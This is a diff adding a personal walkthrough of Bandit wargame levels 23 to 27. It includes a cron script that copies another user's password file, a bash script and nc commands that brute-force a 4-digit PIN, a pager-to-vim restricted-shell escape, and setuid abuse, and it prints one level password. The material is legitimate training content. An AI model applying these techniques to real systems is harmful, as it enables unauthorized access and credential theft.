@@ -549,6 +549,187 @@ done
 ```
 
 1. Bandit24's account has a cron job that executes all files within /var/spool/bandit24 and then deletes the file. So what needs to be done is create a script that, when bandit24 runs it, it will copy bandit24's password file into a specified location that we, bandit23, can access. First create your own folder in /tmp to store your own script.  `mkdir /tmp/tokumei` `chmod 777 /tmp/tokumei` to allow bandit24 access
-2. Write your own script using vim and save it in that directory and also change permission on it. `#!/bin/bash cat /etc/bandit_pass/bandit24 >> /tmp/tokumei/key`  The script, named copy.sh, will output bandit24 password to  a file called key and append if it exists. {%hint style="warning"%} I tried using /etc/bandit\_pass/$\(whoami\) in the scipt but it did not work. Have not figured out why. {%endhint%}
+2. Write your own script using vim and save it in that directory and also change permission on it. `#!/bin/bash cat /etc/bandit_pass/bandit24 >> /tmp/tokumei/key`  The script, named copy.sh, will output bandit24 password to  a file called key and append if it exists. _I tried using /etc/bandit\_pass/$\(whoami\) in the scipt but it did not work. Have not figured out why._
 3. Copy copy.sh to bandit24's folder of cronjobs and wait for at least 1 minute and a key file will appear in tokumei's folder. `chmod 777 copy.sh  #change permission access cp copy.sh /var/spool/bandit24/ ls -l /var/spool/bandit24/copy  #to verify if copied`
+
+### Level 24
+
+> A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+
+First of we, we need to see what is going on by connecting to that daemon.
+
+```bash
+bandit24@bandit:/tmp/tokumei$ time nc localhost 30002
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+111 111
+Wrong! Please enter the correct current password. Try again.
+222 222
+Wrong! Please enter the correct current password. Try again.
+Timeout. Exiting.
+
+real    0m30.065s
+user    0m0.002s
+sys     0m0.000s
+```
+
+Once connected, you will be prompted a password and a pin. If the input is wrong, it will print that wrong message. I also timed it to see when it kicks you out. So this daemon will automatically kick you out after 30 seconds. The best way i feel to have approached this problem was to generate a file with all possible inputs and pass it into nc. But because of the timeout limit, I had to split the inputs into files for two separate connections. First I went into my temp folder \(or create a new one\) and created a script to generate inputs called generateinput.sh and chmod 777 it.
+
+```bash
+#!/bin/bash
+# password was retrieved via file
+pw=$(cat /etc/bandit_pass/bandit24)
+
+# all iterations from 0000 to 9999
+for i in {0000..9999}
+do
+        if [ $i -gt 5000 ]
+        then
+                echo "$pw $i" >> bruteInputs2
+        else
+                echo "$pw $i" >> bruteInputs
+        fi
+done
+```
+
+Run the script for it to generate the two bruteInputs files. 
+
+```bash
+bandit24@bandit:/tmp/tokumei$ ./generateinput.sh
+bandit24@bandit:/tmp/tokumei$ ls -l
+total 396
+-rw-r--r-- 1 bandit24 bandit24     33 Apr 13 00:00 24key
+-rwxr-xr-x 1 bandit24 bandit24    213 Apr 13 00:12 24.sh
+-rw-r--r-- 1 bandit24 bandit24 190038 Apr 13 02:33 bruteInputs
+-rw-r--r-- 1 bandit24 bandit24 189962 Apr 13 02:33 bruteInputs2
+-rwxrwxrwx 1 bandit23 root         65 Apr 12 20:09 copy.sh
+-rwxr-xr-x 1 bandit24 bandit24    180 Apr 13 02:33 generateinput.sh
+-rwxr-xr-x 1 bandit24 bandit24    254 Apr 13 01:08 test24.sh
+```
+
+Then run nc with bruteInputs files as input file and output replies into bruteResponse files.
+
+```bash
+bandit24@bandit:/tmp/tokumei$ nc localhost 30002 < bruteInputs > bruteResponse
+bandit24@bandit:/tmp/tokumei$ nc localhost 30002 < bruteInputs2 > bruteResponse2
+bandit24@bandit:/tmp/tokumei$ ls -l
+total 876
+-rw-r--r-- 1 bandit24 bandit24     33 Apr 13 00:00 24key
+-rwxr-xr-x 1 bandit24 bandit24    213 Apr 13 00:12 24.sh
+-rw-r--r-- 1 bandit24 bandit24 190038 Apr 13 02:33 bruteInputs
+-rw-r--r-- 1 bandit24 bandit24 189962 Apr 13 02:33 bruteInputs2
+-rw-r--r-- 1 bandit24 bandit24 260221 Apr 13 02:35 bruteResponse
+-rw-r--r-- 1 bandit24 bandit24 229140 Apr 13 02:36 bruteResponse2
+-rwxrwxrwx 1 bandit23 root         65 Apr 12 20:09 copy.sh
+-rwxr-xr-x 1 bandit24 bandit24    180 Apr 13 02:33 generateinput.sh
+-rwxr-xr-x 1 bandit24 bandit24    254 Apr 13 01:08 test24.sh
+```
+
+Sort the response files and look for unique occurrences.
+
+```bash
+bandit24@bandit:/tmp/tokumei$ sort bruteResponse | uniq -u
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Timeout. Exiting.
+bandit24@bandit:/tmp/tokumei$ sort bruteResponse2 | uniq -u
+
+Correct!
+Exiting.
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+The password of user bandit25 is {password}
+```
+
+### Level 25
+
+> Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not **/bin/bash**, but something else. Find out what it is, how it works and how to break out of it.  
+> useful cmd: ssh, cat, more, vi, ls, id, pwd
+
+Once logged in, you are presented with an ssh key. Try to ssh using it.
+
+```bash
+bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost
+```
+
+Login is successful but you get disconnected immediately. Because of the clue "not /bin/bash", look at /etc/passwd.  
+
+{% hint style="info" %}
+ /etc/passwd is a text [file](http://www.linfo.org/filedef.html) that contains the attributes of \(i.e., basic information about\) each user or account on a [computer](http://www.linfo.org/computer.html) running [Linux](http://www.linfo.org/linuxdef.html) or another [Unix-like](http://www.linfo.org/unix-like.html) [operating system](http://www.linfo.org/operating_system.html).
+{% endhint %}
+
+one of the lines read out will be  
+`bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext`
+
+```bash
+bandit25@bandit:~$ cat /usr/bin/showtext
+#!/bin/sh
+
+export TERM=linux
+
+more ~/text.txt
+exit 0
+```
+
+The trick to solving this challenge is by resizing your terminal so that it barely shows the ascii bandit26 so that it does not load everything it should. 
+
+![](../.gitbook/assets/25a.png)
+
+Because it does not load everything it allows you to input something to continue. Instead of loading more, press `v` to open vim editor. Once in vim, type `:e /etc/bandit_pass/bandit26` in order to open and edit that file. Upon successful, the password will be shown in line 1 of the text file.
+
+![](../.gitbook/assets/25.png)
+
+### Level 26
+
+> Good job getting a shell! Now hurry and grab the password for bandit27!
+
+So apparently we still  have the problem of being kicked out when logging in. Once again resize your terminal as above and then get into vim again. We are going to use vim's commands to enter bash.
+
+```bash
+:set shell=/bin/bash    # set vim to use /bin/bash as a shell command
+:shell                  # opens /bin/bash
+```
+
+Then run bandit27-do file. With escalated permission as bandit27 during the execution, cat bandit27's password file.
+
+```bash
+bandit26@bandit:~$ ls -l
+total 12
+-rwsr-x--- 1 bandit27 bandit26 7296 Oct 16  2018 bandit27-do
+-rw-r----- 1 bandit26 bandit26  258 Oct 16  2018 text.txt
+bandit26@bandit:~$ cat text.txt
+  _                     _ _ _   ___   __
+ | |                   | (_) | |__ \ / /
+ | |__   __ _ _ __   __| |_| |_   ) / /_
+ | '_ \ / _` | '_ \ / _` | | __| / / '_ \
+ | |_) | (_| | | | | (_| | | |_ / /| (_) |
+ |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/
+bandit26@bandit:~$ ./bandit27-do
+Run a command as another user.
+  Example: ./bandit27-do id
+bandit26@bandit:~$ whoami
+bandit26
+bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
+
+```
+
+3ba3118a22e93127a4ed485be72ef5ea
+
+### Level 27
+
+> There is a git repository at `ssh://bandit27-git@localhost/home/bandit27-git/repo`. The password for the user `bandit27-git` is the same as for the user `bandit27`.
+>
+> Clone the repository and find the password for the next level.
+
+This sounded pretty straight-forward at first; just clone the directory.
+
+```bash
+bandit27@bandit:~$ git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
+fatal: could not create work tree dir 'repo': Permission denied
+
+# then I even tried initializing current directory to pull git 
+bandit27@bandit:~$ sudo git init .
+sudo: /usr/bin/sudo must be owned by uid 0 and have the setuid bit set
+bandit27@bandit:~$ git init
+/home/bandit27/.git: Permission denied
+
+
+```
 
